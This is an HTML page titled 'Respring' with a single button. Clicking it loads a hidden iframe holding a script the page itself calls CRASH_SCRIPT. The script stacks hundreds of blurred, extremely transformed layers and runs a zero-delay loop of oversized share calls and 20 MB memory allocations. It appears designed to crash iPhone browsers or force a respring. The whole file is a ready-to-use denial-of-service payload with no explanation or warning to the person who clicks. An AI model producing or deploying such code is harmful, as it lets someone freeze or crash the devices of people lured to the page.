<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Respring</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      background-color: #121212;
      color: #888888;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      width: 100vw;
      overflow: hidden;
    }
    
    button {
      background-color: #1e1e1e;
      color: #888888;
      border: 1px solid #333333;
      padding: 16px 32px;
      font-size: 18px;
      font-weight: 500;
      border-radius: 12px;
      cursor: pointer;
      transition: all 0.2s ease;
      -webkit-tap-highlight-color: transparent;
    }
    
    button:active {
      background-color: #2a2a2a;
      transform: scale(0.96);
    }
  </style>
</head>
<body>

  <button id="respring-btn">Respring</button>

  <script>
    const CRASH_SCRIPT = `<!doctype html>
<html>
<body style="margin:0;overflow:hidden">
<script>
const container = document.createElement('div');
container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
document.body.appendChild(container);

for (let i = 0; i < 500; i++) {
  const layer = document.createElement('div');
  layer.style.cssText = 'position:absolute;width:100vw;height:100vh;backdrop-filter:blur(100px);-webkit-backdrop-filter:blur(100px);transform:translate3d(100000px,100000px,' + i + 'px) rotateY(90deg);opacity:0.99;';
  container.appendChild(layer);
}

setInterval(() => {
  try { navigator.share({title:'R', text:'R'.repeat(100000)}); } catch (e) {}
  const block = new Uint8Array(1024 * 1024 * 20);
  crypto.getRandomValues(block);
}, 0);
<\/script>
</body>
</html>`;

    document.getElementById('respring-btn').addEventListener('click', () => {
      const frame = document.createElement('iframe');
      frame.style.display = 'none';
      frame.setAttribute('sandbox', 'allow-scripts allow-same-origin');
      frame.srcdoc = CRASH_SCRIPT;
      document.body.append(frame);
    });
  </script>
</body>
</html>
